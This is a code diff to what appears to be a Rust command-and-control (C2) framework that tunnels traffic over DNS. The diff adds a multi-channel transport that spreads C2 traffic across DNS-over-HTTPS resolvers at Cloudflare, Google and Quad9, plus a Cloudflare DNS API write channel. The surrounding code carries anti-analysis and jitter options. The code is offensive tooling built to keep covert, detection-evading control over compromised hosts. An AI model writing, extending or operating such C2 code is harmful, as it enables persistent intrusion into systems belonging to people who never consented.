@@ -122,6 +122,13 @@ enum Commands {
         /// Anti-analysis paranoia threshold 0.0-1.0 (0.0=disabled, 0.3=moderate)
         #[arg(long, default_value_t = 0.0)]
         paranoia: f64,
+
+        /// Multi-channel transport: comma-separated list of channels
+        /// Format: type:provider (e.g. doh:cloudflare,doh:google,api:cloudflare)
+        /// Available types: doh (DNS-over-HTTPS), api (Cloudflare API)
+        /// Available providers: cloudflare, google, quad9
+        #[arg(long)]
+        channels: Option<String>,
     },
 
     /// List active sessions (operator-side)
@@ -368,10 +375,10 @@ fn main() {
             session_id,
             profile,
             paranoia,
+            channels,
         } => {
             let master_key = crypto::key_from_hex(&key).expect("Invalid key");
             let session = session_id.unwrap_or_else(c2::generate_session_id);
-            let backend = make_backend(&conn);
             let rt = tokio::runtime::Runtime::new().unwrap();
 
             let strategy = jitter_strategy
@@ -380,6 +387,48 @@ fn main() {
                     eprintln!("{e}");
                     std::process::exit(1);
                 });
+
+            // Build backend: multi-channel if --channels specified, otherwise single
+            let backend: Box<dyn dns::DnsBackend> = if let Some(ref ch_spec) = channels {
+                let multi = dns::multi::MultiBackend::new();
+                for (i, spec) in ch_spec.split(',').enumerate() {
+                    let parts: Vec<&str> = spec.trim().splitn(2, ':').collect();
+                    let (ch_type, provider) = match parts.len() {
+                        2 => (parts[0], parts[1]),
+                        1 => (parts[0], "cloudflare"),
+                        _ => { eprintln!("Invalid channel spec: {spec}"); std::process::exit(1); }
+                    };
+                    let priority = (i + 1) as u32;
+                    match ch_type {
+                        "doh" => {
+                            let doh = match provider {
+                                "cloudflare" | "cf" => dns::doh::DoHBackend::cloudflare(),
+                                "google" | "goog" => dns::doh::DoHBackend::google(),
+                                "quad9" | "q9" => dns::doh::DoHBackend::quad9(),
+                                url if url.starts_with("https://") => dns::doh::DoHBackend::new(url),
+                                _ => { eprintln!("Unknown DoH provider: {provider}"); std::process::exit(1); }
+                            };
+                            multi.add_ro_channel(&format!("doh-{provider}"), Box::new(doh), priority);
+                        }
+                        "api" => {
+                            let token = conn.token.clone().expect("API channel requires --token or C2_CF_TOKEN");
+                            let zone = conn.zone.clone().expect("API channel requires --zone or C2_CF_ZONE");
+                            let cf = dns::retry::RetryBackend::with_defaults(
+                                Box::new(dns::cloudflare::CloudflareBackend::new(token, zone))
+                            );
+                            multi.add_rw_channel(&format!("api-{provider}"), Box::new(cf), priority);
+                        }
+                        _ => { eprintln!("Unknown channel type: {ch_type} (try: doh, api)"); std::process::exit(1); }
+                    }
+                }
+                eprintln!("Multi-channel transport: {} channels", multi.channel_count());
+                for line in multi.status_summary() {
+                    eprintln!("  {line}");
+                }
+                Box::new(multi)
+            } else {
+                make_backend(&conn)
+            };
 
             // Build traffic profile from --profile flag or fall back to manual interval/jitter
             let traffic_profile = if let Some(ref p) = profile {
